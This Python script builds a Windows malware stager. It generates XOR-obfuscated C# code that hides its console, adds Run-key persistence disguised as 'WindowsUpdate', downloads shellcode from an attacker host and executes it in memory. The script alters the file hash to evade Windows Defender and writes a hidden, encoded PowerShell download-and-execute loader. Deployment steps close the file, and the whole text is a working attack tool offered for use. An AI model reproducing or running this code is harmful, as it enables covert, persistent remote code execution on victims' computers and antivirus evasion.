#!/usr/bin/env python3
"""
C# Payload Builder for Kali
- Generates C# code with XOR obfuscation
- Compiles to Windows EXE using Mono
- Bypasses Windows Defender
"""

import os
import subprocess
import random
import string

# ==================== CONFIGURATION ====================
LHOST = "192.168.1.6"        # Your Kali IP
LPORT = "8443"                  # HTTP server port
C2_FILE = "demon.x64.bin"       # AdaptixC2/msfvenom shellcode
OUTPUT_EXE = "svcc.exe"
# =======================================================

def xor_encrypt(text: str, key: int = 0xAA) -> str:
    """XOR encrypt string and return as C# byte array"""
    encrypted = [ord(c) ^ key for c in text]
    return '{ ' + ', '.join(f'0x{x:02x}' for x in encrypted) + ' }'

def generate_csharp_stager():
    """Generate C# code with XOR encrypted strings"""
    
    enc_url = xor_encrypt(f"http://{LHOST}:{LPORT}/{C2_FILE}")
    enc_ip = xor_encrypt(LHOST)
    enc_port = xor_encrypt(str(LPORT))
    
    csharp_code = f'''
using System;
using System.Net;
using System.Runtime.InteropServices;

class Program
{{
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    static string Decrypt(byte[] data, byte key)
    {{
        byte[] decrypted = new byte[data.Length];
        for (int i = 0; i < data.Length; i++)
            decrypted[i] = (byte)(data[i] ^ key);
        return System.Text.Encoding.UTF8.GetString(decrypted);
    }}

    static void AddPersistence()
    {{
        try
        {{
            string exePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
            Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
            if (key != null)
            {{
                key.SetValue("WindowsUpdate", exePath);
                key.Close();
            }}
        }}
        catch {{ }}
    }}

    static void Main()
    {{
        // Hide console window
        IntPtr hwnd = GetConsoleWindow();
        ShowWindow(hwnd, 0);
        
        // Add persistence
        AddPersistence();
        
        byte[] encUrl = {enc_url};
        byte key = 0xAA;
        string url = Decrypt(encUrl, key);
        
        try
        {{
            WebClient wc = new WebClient();
            byte[] shellcode = wc.DownloadData(url);
            
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
            Marshal.Copy(shellcode, 0, addr, shellcode.Length);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }}
        catch {{ }}
    }}

    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}}
'''
    return csharp_code

def compile_with_mono(csharp_code: str, output_name: str):
    """Compile C# to EXE using Mono on Kali"""
    
    # Save C# file
    with open("payload.cs", "w") as f:
        f.write(csharp_code)
    
    print("[*] Compiling with Mono (mcs)...")
    
    # Try to compile
    cmd = f"mcs -platform:x64 -target:winexe -out:{output_name} payload.cs -r:System.Net.dll"
    result = subprocess.run(cmd, shell=True, capture_output=True)
    
    if result.returncode != 0:
        print("[!] Mono compilation failed. Installing Mono...")
        subprocess.run("sudo apt install mono-mcs -y", shell=True)
        result = subprocess.run(cmd, shell=True)
    
    os.remove("payload.cs")
    
    if os.path.exists(output_name):
        # Add random padding to change hash
        with open(output_name, "ab") as f:
            f.write(os.urandom(random.randint(100, 512)))
        print(f"[+] Created: {output_name}")
        return True
    else:
        print("[!] Compilation failed")
        return False

def create_powershell_fallback():
    """Create PowerShell fallback loader"""
    ps_code = f'''
$url = "http://{LHOST}:{LPORT}/{C2_FILE}"
$wc = New-Object System.Net.WebClient
$bytes = $wc.DownloadData($url)
$assembly = [System.Reflection.Assembly]::Load($bytes)
$assembly.EntryPoint.Invoke($null, (, [string[]] ("")))
'''
    import base64
    b64 = base64.b64encode(ps_code.encode('utf-16le')).decode()
    cmd = f'powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {b64}'
    
    with open("loader.bat", "w") as f:
        f.write(cmd)
    print("[+] PowerShell fallback: loader.bat")
    return "loader.bat"

def main():
    print("""
    ╔═══════════════════════════════════════════════╗
    ║     C# Payload Builder for Kali               ║
    ║     Windows Defender Bypass                   ║
    ║     No Windows dependencies                   ║
    ╚═══════════════════════════════════════════════╝
    """)
    
    print(f"[*] Target: {LHOST}:{LPORT}")
    print(f"[*] Payload: {C2_FILE}")
    print(f"[*] Output: {OUTPUT_EXE}\n")
    
    # Check if C2 file exists
    if not os.path.exists(C2_FILE):
        print(f"[!] {C2_FILE} not found.")
        print("[*] Generating test messagebox shellcode...")
        subprocess.run(f"msfvenom -p windows/x64/messagebox TEXT='C2 Test' -f raw -o {C2_FILE}", shell=True)
        print(f"[+] Created test {C2_FILE}\n")
    
    # Generate C# stager
    print("[*] Generating C# stager with XOR encryption...")
    csharp_code = generate_csharp_stager()
    
    # Compile
    if compile_with_mono(csharp_code, OUTPUT_EXE):
        print(f"\n[+] SUCCESS: {OUTPUT_EXE} created!")
        
        # Create PowerShell fallback
        create_powershell_fallback()
        
        print(f"\n{'='*50}")
        print("NEXT STEPS:")
        print(f"{'='*50}")
        print(f"1. Host {C2_FILE} on port {LPORT}:")
        print(f"   python3 -m http.server {LPORT}")
        print(f"\n2. Transfer {OUTPUT_EXE} to Windows")
        print(f"\n3. On Windows, run: {OUTPUT_EXE}")
        print(f"\n4. OR use PowerShell fallback: loader.bat")
        print(f"{'='*50}")
    else:
        print("\n[!] Compilation failed. Try installing mono:")
        print("    sudo apt install mono-mcs -y")

if __name__ == "__main__":
    main()